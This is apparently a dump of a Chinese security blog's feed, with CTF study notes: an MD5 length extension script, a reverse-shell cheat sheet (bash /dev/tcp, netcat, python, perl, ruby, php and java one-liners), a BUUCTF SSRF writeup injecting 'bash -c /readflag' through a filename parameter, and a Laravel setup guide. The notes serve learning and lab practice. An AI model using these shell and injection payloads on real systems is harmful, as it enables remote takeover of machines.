class="number">8</span>:</span><br><span class="line">hex_str = <span class="string">'0'</span> * (<span class="number">8</span> - len(hex_str)) + hex_str</span><br><span class="line">hex_str_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(hex_str), <span class="number">2</span>):</span><br><span class="line">hex_str_list.append(hex_str[i:i + <span class="number">2</span>])</span><br><span class="line">hex_str_list.reverse()</span><br><span class="line">hex_str_result = <span class="string">'0x'</span> + <span class="string">''</span>.join(hex_str_list)</span><br><span class="line"><span class="keyword">return</span> hex_str_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_result</span><span class="params">(f_list)</span>:</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">f_list1 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f_list:</span><br><span class="line">f_list1[f_list.index(i)] = reverse_hex(i)[<span class="number">2</span>:]</span><br><span class="line">result += f_list1[f_list.index(i)]</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(input_m, msg_lenth=<span class="number">0</span>)</span>:</span></span><br><span class="line">ascii_list = list(map(hex, map(ord, input_m)))</span><br><span class="line">msg_lenth += len(ascii_list) * <span class="number">8</span></span><br><span class="line">ascii_list.append(<span class="string">'0x80'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ascii_list)):</span><br><span class="line"><span class="keyword">if</span> len(ascii_list[i]) &lt; <span class="number">4</span>:</span><br><span class="line">ascii_list[i] = <span class="string">'0x'</span> + <span class="string">'0'</span> + ascii_list[i][<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">while</span> (len(ascii_list) * <span class="number">8</span> + <span class="number">64</span>) % <span class="number">512</span> != <span class="number">0</span>:</span><br><span class="line">ascii_list.append(<span class="string">'0x00'</span>)</span><br><span class="line">msg_lenth_0x = hex(msg_lenth)[<span class="number">2</span>:]</span><br><span class="line">msg_lenth_0x = <span class="string">'0x'</span> + msg_lenth_0x.rjust(<span class="number">16</span>, <span class="string">'0'</span>)</span><br><span class="line">msg_lenth_0x_big_order = reverse_hex(msg_lenth_0x)[<span class="number">2</span>:]</span><br><span class="line">msg_lenth_0x_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(msg_lenth_0x_big_order), <span class="number">2</span>):</span><br><span class="line">msg_lenth_0x_list.append(<span class="string">'0x'</span> + msg_lenth_0x_big_order[i: i + <span class="number">2</span>])</span><br><span class="line">ascii_list.extend(msg_lenth_0x_list)</span><br><span class="line"><span class="keyword">return</span> ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(input_m)</span>:</span></span><br><span class="line"><span class="keyword">global</span> Ti_count</span><br><span class="line">Ti_count = <span class="number">1</span></span><br><span class="line">abcd_list = [<span class="string">'0x67452301'</span>, <span class="string">'0xefcdab89'</span>, <span class="string">'0x98badcfe'</span>, <span class="string">'0x10325476'</span>]</span><br><span class="line">ascii_list = padding(input_m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ascii_list) // <span class="number">64</span>):</span><br><span class="line">aa, bb, cc, dd = abcd_list</span><br><span class="line">order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">output_a = hex((int(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + int(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">output_b = hex((int(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + int(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">output_c = hex((int(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + int(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">output_d = hex((int(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + int(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">Ti_count = <span class="number">1</span></span><br><span class="line">print(ascii_list)</span><br><span class="line"><span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># md5-Length Extension Attack: 计算 md5(message + padding + suffix), res = md5(message), len_m = len(message)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_lea</span><span class="params">(suffix, res, len_m)</span>:</span></span><br><span class="line"><span class="keyword">global</span> Ti_count</span><br><span class="line">Ti_count = <span class="number">1</span></span><br><span class="line">abcd_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">abcd_list.append(reverse_hex(<span class="string">'0x'</span> + res[i: i + <span class="number">8</span>]))</span><br><span class="line">ascii_list = padding(suffix, (len_m + <span class="number">72</span>) // <span class="number">64</span> * <span class="number">64</span> * <span class="number">8</span>)  <span class="comment"># len(message + padding) * 8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ascii_list) // <span class="number">64</span>):</span><br><span class="line">aa, bb, cc, dd = abcd_list</span><br><span class="line">order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">output_a = hex((int(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + int(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">output_b = hex((int(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + int(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">output_c = hex((int(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + int(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">output_d = hex((int(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + int(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">Ti_count = <span class="number">1</span></span><br><span class="line"><span class="comment"># print(ascii_list)</span></span><br><span class="line"><span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">print(md5_lea(<span class="string">'chenxiyuan'</span>,<span class="string">'571580b26c65f306376d4f64e53cb5c7'</span>,<span class="number">15</span>))</span><br></pre></td></tr></table></figure></p><p>抓包添加<code>getmein=994ef981b26dd24cd67d001088e34e24</code>,即可得到flag<br><img src="http://i1.fuimg.com/665720/49c5b1c2cc10daab.png" alt="Markdown"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为web狗,还是有必要点点其他方向的技能树的.<br>参考了几位大佬的博客:<br><a href="https://www.kingkk.com/2018/08/%E8%BF%9F%E5%AD%A6%E7%9A%84%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">kingkk</a><br><a href="https://seaii-blog.com/index.php/2017/05/12/56.html" target="_blank" rel="noopener">seaii</a><br><a href="https://blog.csdn.net/wy_97/article/details/76269819" target="_blank" rel="noopener">Sp4rkW</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前做web题碰到md5加密,都是直接用并不了解生成原理.做&lt;a href=&quot;http://ctf5.shiyanbar.com/web/kzhan.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;实验吧让我进来&lt;/a&gt;这道题利用了hash长度扩展攻击,那就来好好学习下吧.&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://chenxiyuan.vip/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>linux反弹shell</title>
    <link href="http://chenxiyuan.vip/2019/07/29/linux%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://chenxiyuan.vip/2019/07/29/linux反弹shell/</id>
    <published>2019-07-29T13:52:53.000Z</published>
    <updated>2019-07-29T16:03:55.924Z</updated>
    
    <content type="html"><![CDATA[<p>之前也看过大牛们做题时利用反弹shell,一直没有仔细研究.今天又看了几位师傅的博客,自己总结一下.</p><h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><p>在渗透测试中,当我们可以得到一个可以执行远程命令的漏洞时,我们通常会去获取一个shell,但是通常服务器防火墙亦或者云上都会对端口等进行严格控制.导致不能通过监听端口进行shell连接,这种情况下该怎么获取shell呢?<br>而通常情况下,不论是防火墙还是云盾等防护措施,不会对服务器对外连接进行限制(特殊情况除外),这时候就可以通过反弹shell来获取连接,即通过服务器反向连接一个外部机器来获取一个shell.<br><a id="more"></a></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在理解反弹shell的操作命令前,可以先看一看前辈写的<a href="https://www.cnblogs.com/chengmo/archive/2010/10/20/1855805.html" target="_blank" rel="noopener">linux文件描述符</a>.<br>攻击机kali:192.168.91.133<br>靶机ubuntu:192.168.91.134</p><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>bash反弹shell应该是最常见的操作.<br>攻击机kali监听2333端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></p><p>靶机:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.133/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>然后kali上就出现了ubuntu的shell.<br><img src="http://i1.fuimg.com/665720/9c1035410241c310.png" alt="Markdown"></p><ul><li><code>bash -i</code> 表示产生一个交互式的shell</li><li><code>dev/tcp/host/port</code> 这个文件非常特殊,可以理解为一个设备.如果host 是一个合法的主机名或internet地址,并且port是一个整数端口号或服务名,bash试图建立与相应的socket(套接字)的TCP连接.</li></ul><h3 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h3><p>netcat的-e参数后面跟一个可执行程序的名称,因为我的ubuntu的netcat是不带这个参数e的,所以这里我用kali作为靶机,ubuntu攻击机.<br>ubuntu监听2333端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></p><p>kali弹shell给ubuntu:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.91.134 2333</span><br></pre></td></tr></table></figure></p><p>成功弹shell.<br><img src="http://i1.fuimg.com/665720/b6d1dfb2285884ed.png" alt="Markdown"></p><h3 id="利用管道反弹shell"><a href="#利用管道反弹shell" class="headerlink" title="利用管道反弹shell"></a>利用管道反弹shell</h3><p>因为有的发行版linux中netcat是不带这个参数的,这时候可以利用管道进行反弹shell.<br>首先攻击机kali监听两个端口2333,7777:<br><img src="http://i1.fuimg.com/665720/ad21ca669d2ac1fd.png" alt="Markdown"><br>然后ubuntu连接攻击机2333端口,将传递过来的命令交给/bin/bash执行然后将结果返回到7777端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.91.133 2333 | /bin/bash | nc 192.168.91.133 7777</span><br></pre></td></tr></table></figure></p><p>监听2333端口的会话成功得到shell,然后执行命令,结果返回在7777端口的会话.<br><img src="http://i1.fuimg.com/665720/9dd9c50921f9b1df.png" alt="Markdown"></p><h3 id="常见脚本反弹"><a href="#常见脚本反弹" class="headerlink" title="常见脚本反弹"></a>常见脚本反弹</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure><p><img src="http://i1.fuimg.com/665720/823a2db1273bc45f.png" alt="Markdown"></p><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>方法1:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="x.x.x.x";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p><p><img src="http://i2.tiimg.com/665720/2871aebae95374bb.png" alt="Markdown"><br>方法2:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:port");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure></p><p><img src="http://i2.tiimg.com/665720/c8a3c96c94c30eff.png" alt="Markdown"></p><h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("x.x.x.x","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("x.x.x.x",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   public class Revs &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    */</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前也看过大牛们做题时利用反弹shell,一直没有仔细研究.今天又看了几位师傅的博客,自己总结一下.&lt;/p&gt;
&lt;h2 id=&quot;为什么要反弹shell&quot;&gt;&lt;a href=&quot;#为什么要反弹shell&quot; class=&quot;headerlink&quot; title=&quot;为什么要反弹shell&quot;&gt;&lt;/a&gt;为什么要反弹shell&lt;/h2&gt;&lt;p&gt;在渗透测试中,当我们可以得到一个可以执行远程命令的漏洞时,我们通常会去获取一个shell,但是通常服务器防火墙亦或者云上都会对端口等进行严格控制.导致不能通过监听端口进行shell连接,这种情况下该怎么获取shell呢?&lt;br&gt;而通常情况下,不论是防火墙还是云盾等防护措施,不会对服务器对外连接进行限制(特殊情况除外),这时候就可以通过反弹shell来获取连接,即通过服务器反向连接一个外部机器来获取一个shell.&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://chenxiyuan.vip/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="linux" scheme="http://chenxiyuan.vip/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>bugku逆向</title>
    <link href="http://chenxiyuan.vip/2019/07/29/bugku%E9%80%86%E5%90%91/"/>
    <id>http://chenxiyuan.vip/2019/07/29/bugku逆向/</id>
    <published>2019-07-29T07:04:27.000Z</published>
    <updated>2019-07-29T07:38:12.808Z</updated>
    
    <content type="html"><![CDATA[<p>从现在要开始学一点逆向二进制了,先做一点bugku简单的逆向题学习学习.</p><h2 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h2><p>下载到后直接拖到IDA里,直接可以看到printf函数.<br><img src="http://i2.tiimg.com/665720/8dcb9f37a6d36fa2.png" alt="Markdown"><br>对着最右边的字符一顿R,就得到flag了.<br><a id="more"></a></p><h2 id="Easy-vb"><a href="#Easy-vb" class="headerlink" title="Easy_vb"></a>Easy_vb</h2><p>下载后拖到IDA,<code>ALT+T</code>搜索字符串,先搜flag搜不到,再搜<code>{</code>就出来了.<br><img src="http://i2.tiimg.com/665720/58215b81f8a2c501.png" alt="Markdown"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从现在要开始学一点逆向二进制了,先做一点bugku简单的逆向题学习学习.&lt;/p&gt;
&lt;h2 id=&quot;入门逆向&quot;&gt;&lt;a href=&quot;#入门逆向&quot; class=&quot;headerlink&quot; title=&quot;入门逆向&quot;&gt;&lt;/a&gt;入门逆向&lt;/h2&gt;&lt;p&gt;下载到后直接拖到IDA里,直接可以看到printf函数.&lt;br&gt;&lt;img src=&quot;http://i2.tiimg.com/665720/8dcb9f37a6d36fa2.png&quot; alt=&quot;Markdown&quot;&gt;&lt;br&gt;对着最右边的字符一顿R,就得到flag了.&lt;br&gt;
    
    </summary>
    
      <category term="逆向学习笔记" scheme="http://chenxiyuan.vip/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
      <category term="re" scheme="http://chenxiyuan.vip/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF web writeup(二)</title>
    <link href="http://chenxiyuan.vip/2019/07/29/BUUCTF-web-writeup-%E4%BA%8C/"/>
    <id>http://chenxiyuan.vip/2019/07/29/BUUCTF-web-writeup-二/</id>
    <published>2019-07-29T03:24:36.000Z</published>
    <updated>2019-07-29T07:38:13.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Unicorn-shop"><a href="#Unicorn-shop" class="headerlink" title="Unicorn shop"></a>Unicorn shop</h2><p><a href="http://web3.buuoj.cn" target="_blank" rel="noopener">靶机</a><br>这道题想让我们买独角兽,当ID为1,2,3的时候<code>Wrong commodity!</code>,大于4<code>No commodity found!</code>,并且price只允许一个字符<code>Only one char(?) allowed!</code>,那就是要购买4了并且价格那里只能输入一个字符,但是怎么大于1337呢.F12发现网站编码是utf-8,那应该又是编码转换的问题了,在price写万,亿,兆成功获得flag,当然写其他语言的单位也可以,只要大于1337.<br><a id="more"></a></p><h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p><a href="http://web7.buuoj.cn" target="_blank" rel="noopener">靶机</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">      $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>看了大佬们的博客才会的,<code>GET</code>命令漏洞如果文件存在会将其拼接到命令中,具体分析在<a href="http://momomoxiaoxi.com/2017/11/08/HITCON/" target="_blank" rel="noopener">大佬博客</a><br>查询ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L tool.lu/ip</span><br></pre></td></tr></table></figure></p><p><code>php -a</code>进入php命令行交互：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> md5(<span class="string">"orange"</span>.yourip);</span><br></pre></td></tr></table></figure></p><p>扫目录payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先建个文件</span></span><br><span class="line">http://web7.buuoj.cn/?url=&amp;filename=bash -c 'ls /'|</span><br><span class="line"><span class="comment">#执行命令后输出到chenxiyuan</span></span><br><span class="line">http://web7.buuoj.cn/?url=file:bash -c 'ls /'|&amp;filename=chenxiyuan</span><br><span class="line"><span class="comment">#访问</span></span><br><span class="line">http://web7.buuoj.cn/sandbox/<span class="number">99</span>ca4e36b9277744c847e190081f7fed/chenxiyuan</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bin</span></span><br><span class="line"><span class="string">boot</span></span><br><span class="line"><span class="string">dev</span></span><br><span class="line"><span class="string">etc</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">home</span></span><br><span class="line"><span class="string">lib</span></span><br><span class="line"><span class="string">lib64</span></span><br><span class="line"><span class="string">media</span></span><br><span class="line"><span class="string">mnt</span></span><br><span class="line"><span class="string">opt</span></span><br><span class="line"><span class="string">proc</span></span><br><span class="line"><span class="string">readflag</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">run</span></span><br><span class="line"><span class="string">sbin</span></span><br><span class="line"><span class="string">srv</span></span><br><span class="line"><span class="string">sys</span></span><br><span class="line"><span class="string">tmp</span></span><br><span class="line"><span class="string">usr</span></span><br><span class="line"><span class="string">var</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><p>应该是执行<code>/readflag</code>来读取flag了,继续构造payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建文件</span></span><br><span class="line">http://web7.buuoj.cn/?url=&amp;filename=bash -c /readflag|</span><br><span class="line"><span class="comment">#执行命令输出到flag</span></span><br><span class="line">http://web7.buuoj.cn/?url=file:bash%20-c%20/readflag|&amp;filename=flag</span><br><span class="line"><span class="comment">#访问</span></span><br><span class="line">http://web7.buuoj.cn/sandbox/<span class="number">99</span>ca4e36b9277744c847e190081f7fed/flag</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Unicorn-shop&quot;&gt;&lt;a href=&quot;#Unicorn-shop&quot; class=&quot;headerlink&quot; title=&quot;Unicorn shop&quot;&gt;&lt;/a&gt;Unicorn shop&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://web3.buuoj.cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;靶机&lt;/a&gt;&lt;br&gt;这道题想让我们买独角兽,当ID为1,2,3的时候&lt;code&gt;Wrong commodity!&lt;/code&gt;,大于4&lt;code&gt;No commodity found!&lt;/code&gt;,并且price只允许一个字符&lt;code&gt;Only one char(?) allowed!&lt;/code&gt;,那就是要购买4了并且价格那里只能输入一个字符,但是怎么大于1337呢.F12发现网站编码是utf-8,那应该又是编码转换的问题了,在price写万,亿,兆成功获得flag,当然写其他语言的单位也可以,只要大于1337.&lt;br&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Laravel框架学习</title>
    <link href="http://chenxiyuan.vip/2019/07/25/Laravel%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/25/Laravel框架学习/</id>
    <published>2019-07-24T16:38:04.000Z</published>
    <updated>2019-07-26T06:02:53.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>先切换镜像源吧,不然下不下来laravel框架.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure></p><p>然后进入网站根目录安装laravel框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project laravel/laravel laravel v5.8.17</span><br></pre></td></tr></table></figure></p><p>这里因为我安装的是phpstudy,所以直接访问<code>http://127.0.0.1/laravel/public/</code>即可.<br>也可以cmd进入到public目录,<code>php -S 0.0.0.0:9999</code>,然后访问<code>127.0.0.1:9999</code><br><a id="more"></a></p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>建立url和程序之间的映射.</p><h3 id="路由文件"><a href="#路由文件" class="headerlink" title="路由文件"></a>路由文件</h3><p>5.8版本的路由文件在<code>routes-&gt;web.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span 